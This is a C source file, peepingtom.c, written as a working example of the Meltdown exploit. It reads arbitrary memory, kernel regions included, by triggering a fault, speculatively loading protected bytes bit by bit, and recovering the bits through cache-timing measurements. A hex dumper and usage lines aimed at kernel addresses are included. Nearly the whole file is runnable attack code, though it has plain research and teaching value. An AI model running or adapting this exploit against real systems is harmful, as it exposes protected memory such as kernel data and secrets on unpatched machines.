/*
 * peepingtom.c
 * by Bart Trzynadlowski (2018.01.09)
 *
 * An example of using the Meltdown exploit to read arbitrary memory (including
 * protected regions).
 *
 * Sample usage in (Linux) kernel space:
 *
 *    peepingtom --addr=ffffffff80298100 --len=200
 *
 * Reading own process memory:
 *
 *    peepingtom --addr=400000 --len=100
 *
 * Values are not stable and frequently biased toward zero. Recommend running
 * multiple times over the same address range.
 *
 * Compile like so:
 *
 *    gcc peepingtom.c -o peepingtom -std=gnu99
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include <stdbool.h>
#include <signal.h>
#define __USE_GNU // required for registers in ucontext.h
#include <ucontext.h>

#define CACHE_PROBE_STRIDE 128  // must be multiple of cache line size

volatile uint8_t cache_probe[2 * CACHE_PROBE_STRIDE];
static volatile uint8_t *zero_probe = &cache_probe[0 * CACHE_PROBE_STRIDE];
static volatile uint8_t *one_probe = &cache_probe[1 * CACHE_PROBE_STRIDE];

static inline void flush_cache_line(volatile void *ptr)
{
  asm volatile
  (
    "clflush (%0)"
    :
    : "r" (ptr)
    :
  );
}

static inline uint64_t rdtsc()
{
  uint32_t hi;
  uint32_t lo;
  
  asm volatile
  (
    "cpuid;"
    "rdtsc;"
    : "=a" (lo), "=d" (hi)
    :
    : "ebx", "ecx"
  );
  
  return ((uint64_t) hi << 32) | lo;
}

static inline void serialize_pipeline()
{
  asm volatile
  (
    "cpuid"
    :
    :
    : "ebx", "ecx"
  );
}

static void cache_test()
{
  uint64_t tic;
  uint64_t toc;
  uint64_t uncached_accum = 0;
  uint64_t cached_accum = 0;
  int samples = 1000;
  for (int i = 0; i < samples; i++)
  {
    flush_cache_line(zero_probe);
    tic = rdtsc();
    *zero_probe;
    toc = rdtsc();
    uncached_accum += toc - tic;
    tic = rdtsc();
    *zero_probe;
    toc = rdtsc();
    cached_accum += toc - tic;
  }
  
  double uncached_avg = (double) uncached_accum / samples;
  double cached_avg = (double) cached_accum / samples;
  printf("uncached avg: %1.1f cycles\n", uncached_avg);
  printf("cached avg  : %1.1f cycles\n", cached_avg);
  printf("delta       : %1.1f cycles (%1.1f%%)\n", uncached_avg - cached_avg, 100 * (uncached_avg / cached_avg - 1));
  exit(0);
}

static volatile int peek_bitpos = 0;
static volatile uint8_t peek_value = 0;

static void exception_handler(int signal, siginfo_t *si, void *arg)
{
  uint64_t tic;
  uint64_t toc;
  uint64_t t0;
  uint64_t t1;
  
  tic = rdtsc();
  *zero_probe;
  toc = rdtsc();
  t0 = toc - tic;
  
  tic = rdtsc();
  *one_probe;
  toc = rdtsc();
  t1 = toc - tic;
  
  if (t0 > t1)
    peek_value |= (1 << peek_bitpos);

  // rdx was preloaded with safe return value
  ucontext_t *ctx = (ucontext_t *) arg;
  ctx->uc_mcontext.gregs[REG_RIP] = ctx->uc_mcontext.gregs[REG_RDX];
}

static uint8_t read_byte(volatile uint8_t *ptr, bool direct)
{
  if (direct)
    return *ptr;

  peek_value = 0;
  asm volatile("" ::: "memory");  // compiler memory barrier
  for (peek_bitpos = 0; peek_bitpos < 8; peek_bitpos++)
  {
    flush_cache_line(zero_probe);
    flush_cache_line(one_probe);
    serialize_pipeline();
    asm volatile
    (
      // Return address for exception handler in rdx
      "lea    .safe_return_point_%=,%%rdx;"
      
      // Generate segfault by reading address 0.
      // Note: Inserting serializing instruction (e.g., cpuid) right after this
      // code will naturally prevent the out-of-order loads that follow.
      "mov    $0,%%rax;"
      "mov    (%%rax),%%rax;"
      
      // Read the address we want to peek at (MELTDOWN!) and isolate single bit
      "movzb  (%0),%%rbx;"
      "shr    %%cl,%%rbx;"
      "and    $1,%%bl;"
      "shl    $7,%%ebx;"
      "movzb  cache_probe(%%rbx),%%rax;"
      
      // Exception handler will return here to safely resume execution
      ".safe_return_point_%=:"
      "cpuid"
      
      :
      : "r" (ptr), "c" (peek_bitpos)
      : "rax", "rbx", "rdx"
    );
  }
  
  return peek_value;
}

static void help()
{
  puts("usage: peepingtom [options]");
  puts("options:");
  puts("  --help,-h,-?  Display this help text");
  puts("  --addr=<hex>  Address to start reading at");
  puts("  --len=<hex>   Number of bytes to read [Default: 1]");
  puts("  --value=<hex> Set 8-bit internal variable and read back");
  puts("  --direct      Read memory directly");
  puts("  --indirect    Read memory indirectly via cache timing [Default]");
  puts("  --test        Run cache timing test");
  exit(0);
}

int main(int argc, char **argv)
{
  volatile uint8_t *ptr = 0;
  size_t len = 1;
  uint8_t value = 0;
  bool direct = false;
  
  if (argc <= 1)
    help();

  for (int i = 1; i < argc; i++)
  {
    if (!strcmp(argv[i], "--help") || !strcmp(argv[i], "-h") || !strcmp(argv[i], "-?"))
      help();
    else if (!strncmp(argv[i], "--addr=", 7))
      ptr = (uint8_t *) strtoull(&argv[i][7], 0, 16);
    else if (!strncmp(argv[i], "--len=", 6))
      len = strtoul(&argv[i][6], 0, 16);
    else if (!strncmp(argv[i], "--value=", 8))
    {
      value = strtoul(&argv[i][8], 0, 16);
      ptr = &value;
    }
    else if (!strcmp(argv[i], "--direct"))
      direct = true;
    else if (!strcmp(argv[i], "--indirect"))
      direct = false;
    else if (!strcmp(argv[i], "--test"))
      cache_test();
    else
      fprintf(stderr, "ignoring invalid argument: %s\n", argv[i]);
  }
  
  // Install SIGSEGV handler
  if (!direct)
  {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = exception_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, 0);
  }
  
  // Dump hex
  for (size_t i = 0; i < len; i += 32)
  {
    uint8_t buf[32];
    void *line_start = (void *) ptr;
    size_t j;
    
    for (j = 0; j < 32 && (i + j) < len; j++)
    {
      buf[j] = read_byte(ptr++, direct);
    }
    
    printf("%016llx: ", line_start);
    
    for (j = 0; j < 16 && (i + j) < len; j++)
    {
      printf("%02x ", buf[j]);
    }
    
    printf(" ");
    
    for (; j < 32 && (i + j) < len; j++)
    {
      printf("%02x ", buf[j]);
    }
    
    for (; j < 32; j++)
    {
      printf("   ");
    }
    
    printf("[ ");
    
    for (j = 0; j < 16 && (i + j) < len; j++)
    {
      printf("%c", isprint(buf[j]) ? buf[j] : '.');
    }
    
    printf(" ");
    
    for (; j < 32 && (i + j) < len; j++)
    {
      printf("%c", isprint(buf[j]) ? buf[j] : '.');
    }
    
    for (; j < 32; j++)
    {
      printf(" ");
    }
    
    puts(" ]");
  }
  
  return 0;
}
